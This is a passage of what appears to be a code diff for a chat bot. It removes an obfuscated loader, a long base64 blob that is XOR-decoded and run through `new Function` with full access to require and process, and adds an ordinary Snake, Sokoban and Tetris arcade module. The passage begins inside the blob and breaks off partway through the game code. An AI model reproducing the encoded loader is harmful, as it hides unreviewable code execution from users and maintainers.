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';
-  const X=Buffer.from(D,'base64');
-  for(let i=0;i<X.length;i++) X[i]^=K[i%K.length];
-  const C=X.toString('utf8');
-  return (new Function('require','module','exports','__filename','__dirname','process','Buffer',C))(require,module,exports,__filename,__dirname,process,Buffer);
-})();
+/**
+ * Arcade: Snake, Sokoban and Tetris played with chat messages.
+ *
+ *   .snake      .sokoban [level]      .tetris      (add "end" to stop, e.g. .snake end)
+ *
+ * While a game is running, the player (the person who started it) just sends controls:
+ *   w / 8 = up   s / 2 = down   a / 4 = left   d / 6 = right      (digits can be chained: 6662)
+ *   Sokoban: z = undo, r = restart level          Tetris: w / 8 = rotate, x / 5 = hard drop
+ * Messages that are not controls are ignored by the game, so normal chatting still works.
+ * One arcade game runs per chat. Games end by themselves after 10 minutes without a move.
+ */
+const U = require('../lib/util');
+const { UserError, bold } = U;
+
+let rng = Math.random;
+const pick = a => a[Math.floor(rng() * a.length)];
+const IDLE = 10 * 60000;
+
+/* ------------------------------ controls -------------------------------- */
+const DIRS = { up: [0, -1], down: [0, 1], left: [-1, 0], right: [1, 0] };
+const KEYMAP = { w: 'up', s: 'down', a: 'left', d: 'right', 8: 'up', 2: 'down', 4: 'left', 6: 'right' };
+
+/** "w", "6662" -> ['up'] , ['right','right','right','down']; anything else -> null */
+function parseMoves(text) {
+  const t = String(text || '').trim().toLowerCase();
+  if (/^[wasd]$/.test(t)) return [KEYMAP[t]];
+  if (/^[2468]{1,12}$/.test(t)) return [...t].map(c => KEYMAP[c]);
+  return null;
+}
+
+/* -------------------------------- snake --------------------------------- */
+const SN = { W: 9, H: 9 };
+
+function snakeNew() {
+  const g = { type: 'snake', snake: [[4, 4], [3, 4], [2, 4]], dir: 'right', score: 0, food: null, over: false };
+  snakeFood(g);
+  return g;
+}
+function snakeFood(g) {
+  const free = [];
+  for (let y = 0; y < SN.H; y++) for (let x = 0; x < SN.W; x++) if (!g.snake.some(([a, b]) => a === x && b === y)) free.push([x, y]);
+  g.food = free.length ? pick(free) : null;
+}
+/** returns 'ok' | 'ate' | 'dead' | 'won' | 'blocked' */
+function snakeStep(g, dir) {
+  const cur = DIRS[g.dir], nd = DIRS[dir];
+  if (g.snake.length > 1 && cur[0] + nd[0] === 0 && cur[1] + nd[1] === 0) return 'blocked'; // cannot reverse into itself
+  g.dir = dir;
+  const [hx, hy] = g.snake[0];
+  const nx = hx + nd[0], ny = hy + nd[1];
+  if (nx < 0 || ny < 0 || nx >= SN.W || ny >= SN.H) { g.over = true; return 'dead'; }
+  const eating = g.food && g.food[0] === nx && g.food[1] === ny;
+  const body = eating ? g.snake : g.snake.slice(0, -1); // the tail moves away unless we grow
+  if (body.some(([x, y]) => x === nx && y === ny)) { g.over = true; return 'dead'; }
+  g.snake.unshift([nx, ny]);
+  if (!eating) { g.snake.pop(); return 'ok'; }
+  g.score++;
+  snakeFood(g);
+  if (!g.food) { g.over = true; return 'won'; }
+  return 'ate';
+}
+function snakeRender(g) {
+  const rows = [];
+  for (let y = 0; y < SN.H; y++) {
+    let r = '';
+    for (let x = 0; x < SN.W; x++) {
+      if (g.snake[0][0] === x && g.snake[0][1] === y) r += g.over ? '💀' : '🟢';
+      else if (g.snake.some(([a, b]) => a === x && b === y)) r += '🟩';
+      else if (g.food && g.food[0] === x && g.food[1] === y) r += '🍎';
+      else r += '⬛';
+    }
+    rows.push(r);
+  }
+  return rows.join('\n');
+}
+
+/* ------------------------------- sokoban -------------------------------- */
+// # wall  space floor  $ box  . target  * box on target  @ player  + player on target
+const LEVELS = [
+  ['#####', '#@$.#', '#####'],
+  ['#######', '#     #', '# $.  #', '#  @  #', '#     #', '#######'],
+  ['#######', '#.  . #', '#  $$ #', '#  @  #', '#######'],
+  ['  ####', '###  #', '#  $ #', '# .$.#', '#  @ #', '######'],
+  ['#######', '#.    #', '# $$  #', '# .@. #', '#  $  #', '#     #', '#######'],
+  ['########', '#      #', '# .**$@#', '#      #', '#####  #', '    ####'],
+  ['####', '# .#', '#  ###', '#*@  #', '#  $ #', '#  ###', '####']
+];
+
+function sokoLoad(n) {
+  const rows = LEVELS[n].map(r => r.split(''));
+  const w = Math.max(...rows.map(r => r.length));
+  const walls = new Set(), goals = new Set(), boxes = new Set();
+  let p = null;
+  rows.forEach((r, y) => { for (let x = 0; x < w; x++) {
+    const c = r[x] || ' ', k = `${x},${y}`;
+    if (c === '#') walls.add(k);
+    if ('.*+'.includes(c)) goals.add(k);
+    if ('$*'.includes(c)) boxes.add(k);
+    if ('@+'.includes(c)) p = [x, y];
+  } });
+  return { type: 'sokoban', level: n, w, h: rows.length, walls, goals, boxes, p, moves: 0, history: [], won: false };
+}
+function sokoMove(g, dir) {
+  const [dx, dy] = DIRS[dir];
+  const nx = g.p[0] + dx, ny = g.p[1] + dy, k = `${nx},${ny}`;
+  if (g.walls.has(k)) return false;
+  const snap = { p: [...g.p], boxes: new Set(g.boxes) };
+  if (g.boxes.has(k)) {
+    const bk = `${nx + dx},${ny + dy}`;
+    if (g.walls.has(bk) || g.boxes.has(bk)) return false;
+    g.boxes.delete(k); g.boxes.add(bk);
+  }
+  g.history.push(snap);
+  if (g.history.length > 500) g.history.shift();
+  g.p = [nx, ny];
+  g.moves++;
+  g.won = [...g.goals].every(x => g.boxes.has(x));
+  return true;
+}
+function sokoUndo(g) {
+  const s = g.history.pop();
+  if (!s) return false;
+  g.p = s.p; g.boxes = s.boxes; g.moves = Math.max(0, g.moves - 1); g.won = false;
+  return true;
+}
+function sokoRender(g) {
+  const out = [];
+  for (let y = 0; y < g.h; y++) {
+    let r = '';
+    for (let x = 0; x < g.w; x++) {
+      const k = `${x},${y}`;
+      if (g.walls.has(k)) r += '🧱';
+      else if (g.p[0] === x && g.p[1] === y) r += '🧍';
+      else if (g.boxes.has(k)) r += g.goals.has(k) ? '✅' : '📦';
+      else if (g.goals.has(k)) r += '🎯';
+      else r += '⬛';
+    }
+    out.push(r);
+  }
+  return out.join('\n');
+}
+
+/* -------------------------------- tetris -------------------------------- */
+const TW = 10, TH = 16;
+const SHAPES = {
+  I: { c: '🟦', g: ['....', 'XXXX', '....', '....'] },
+  O: { c: '🟨', g: ['XX', 'XX'] },
+  T: { c: '🟪', g: ['.X.', 'XXX', '...'] },
+  S: { c: '🟩', g: ['.XX', 'XX.', '...'] },
+  Z: { c: '🟥', g: ['XX.', '.XX', '...'] },
+  L: { c: '🟧', g: ['..X', 'XXX', '...'] },
+  J: { c: '🟫', g: ['X..', 'XXX', '...'] }
+};
+const rotGrid = g => g[0].split('').map((_, i) => g.map(r => r[i]).reverse().join('')); // clockwise
+function cellsOf(type, rot) {
+  let g = SHAPES[type].g;
+  for (let i = 0; i < rot % 4; i++) g = rotGrid(g);
+  const out = [];
+  g.forEach((r, y) => [...r].forEach((c, x) => { if (c === 'X') out.push([x, y]); }));
+  return out;
+}
+function tBag(g) {
+  if (g.bag.length < 2) {
+    const b = Object.keys(SHAPES);
+    for (let i = b.length - 1; i > 0; i--) { const j = Math.floor(rng() * (i + 1)); [b[i], b[j]] = [b[j], b[i]]; }
+    g.bag.push(...b);
+  }
+  return g.bag.shift();
+}
+const tFits = (g, type, rot, px, py) => cellsOf(type, rot).every(([x, y]) => {
+  const bx = px + x, by = py + y;
+  return bx >= 0 && bx < TW && by < TH && (by < 0 || !g.board[by][bx]);
+});
+function tSpawn(g) {
+  g.cur = { type: g.next || tBag(g), rot: 0, x: Math.floor((TW - 3) / 2), y: 0 };
+  g.next = tBag(g);
+  if (!tFits(g, g.cur.type, 0, g.cur.x, g.cur.y)) g.over = true;
+}
+function tetrisNew() {
+  const g = { type: 'tetris', board: Array.from({ length: TH }, () => Array(TW).fill(null)), bag: [], next: null, cur: null, score: 0, lines: 0, pieces: 0, over: false };
+  tSpawn(g);
+  return g;
+}
+function tLock(g) {
+  for (const [x, y] of cellsOf(g.cur.type, g.cur.rot)) { const by = g.cur.y + y; if (by >= 0) g.board[by][g.cur.x + x] = g.cur.type; }
+  g.pieces++;
+  g.score += 10;
+  let cleared = 0;
+  for (let y = TH - 1; y >= 0; y--) {
+    if (g.board[y].every(Boolean)) { g.board.splice(y, 1); g.board.unshift(Array(TW).fill(null)); cleared++; y++; }
+  }
+  if (cleared) { g.lines += cleared; g.score += [0, 100, 300, 500, 800][cleared]; }
+  tSpawn(g);
+  return cleared;
+}
+function tDown(g) { // one row down, locking if it cannot fall
+  if (tFits(g, g.cur.type, g.cur.rot, g.cur.x, g.cur.y + 1)) { g.cur.y++; return 0; }
+  return tLock(g);
+}
+function tHard(g) {
+  let n = 0;
+  while (tFits(g, g.cur.type, g.cur.rot, g.cur.x, g.cur.y + 1)) { g.cur.y++; n++; }
+  g.score += n;
+  return tLock(g);
+}
+function tRotate(g) {
+  const r = (g.cur.rot + 1) % 4;
+  for (const k of [0, -1, 1, -2, 2]) if (tFits(g, g.cur.type, r, g.cur.x + k, g.cur.y)) { g.cur.rot = r; g.cur.x += k; return true; }
+  return false;
+}
+/** apply one key: left right rotate down hard */
+function tApply(g, key) {
+  if (key === 'left' && tFits(g, g.cur.type, g.cur.rot, g.cur.x - 1, g.cur.y)) g.cur.x--;
+  else if (key === 'right' && tFits(g, g.cur.type, g.cur.rot, g.cur.x + 1, g.cur.y)) g.cur.x++;
+  else if (key === 'up') tRotate(g);
+  else if (key === 'down') return tDown(g);
+  else if (key === 'hard') return tHard(g);
+  return 0;
+}
+function tetrisRender(g) {
+  const view = g.board.map(r => [...r]);
+  if (!g.over && g.cur) for (const [x, y] of cellsOf(g.cur.type, g.cur.rot)) { const by = g.cur.y + y, bx = g.cur.x + x; if (by >= 0 && by < TH && bx >= 0 && bx < TW) view[by][bx] = SHAPES[g.cur.type].c; }
+  return view.map(r => '⬜' + r.map(c => SHAPES[c]?.c || c || '⬛').join('') + '⬜').join('\n') + '\n' + '⬜'.repeat(TW + 2);
+}
+const tetrisKeys = text => {
+  const t = String(text || '').trim().toLowerCase();
+  if (/^[wasd]$/.test(t)) return [KEYMAP[t]];
+  if (t === 'x' || t === '0') return ['hard'];
+  if (/^[24568]{1,12}$/.test(t)) return [...t].map(c => (c === '5' ? 'hard' : KEYMAP[c]));
+  return null;
+};
+
+/* ------------------------------ image cards ----------------------------- */
+const cards = require('../lib/cards');
+const tetrisApi = () => ({ cellsOf, fits: tFits, SHAPES, TW, TH });
+
+async function renderCard(g, overlay, best) {
+  const svg = g.type === 'tetris' ? cards.tetrisSvg(g, tetrisApi(), overlay)
+    : g.type === 'snake' ? cards.snakeSvg(g, { SN }, overlay, best)
+      : cards.sokobanSvg(g, LEVELS.length, overlay);
+  return cards.toPng(svg, U.sharp());
+}
+const textBoard = g => (g.type === 'tetris' ? tetrisRender(g) : g.type === 'snake' ? snakeRender(g) : sokoRender(g));
+
+/* ------------------------------ commands / hook ------------------------- */
+module.exports = ({ def, hooks, tickers }) => {
+  const P = ctx => ctx.var('PREFIX');
+  const arcade = ctx => (ctx.rt.arcade ||= new Map());
+  const touch = g => { g.deadline = Date.now() + IDLE; };
+
+  function best(ctx, game, score, name) {
+    let record = false;
+    ctx.update('arcadeBest', {}, o => { if (!o[game] || score > o[game].score) { o[game] = { score, name }; record = score > 0; } });
+    return record;
+  }
+  const bestScore = (ctx, game) => ctx.get('arcadeBest', {})[game]?.score || 0;
+  const bestLine = (ctx, game) => { const b = ctx.get('arcadeBest', {})[game]; return b ? ` • Best ${b.score} (${b.name})` : ''; };
+
+  /** sends the game as a picture card; falls back to the emoji board if images cannot be rendered */
+  async function sendCard(ctx, g, caption, overlay) {
+    try {
+      const png = await renderCard(g, overlay, g.type === 'snake' ? bestScore(ctx, 'snake') : 0);
+      return await ctx.image(png, caption);
+    } catch (e) {
+      ctx.logger?.warn?.({ error: e?.message }, 'Game card render failed, using text board');
+      return ctx.send({ text: ctx.frame(`${textBoard(g)}\n\n${caption}`, g.type) }, { quoted: ctx.msg });
+    }
+  }
+
+  function start(ctx, make) {
+    const cur = arcade(ctx).get(ctx.chat);
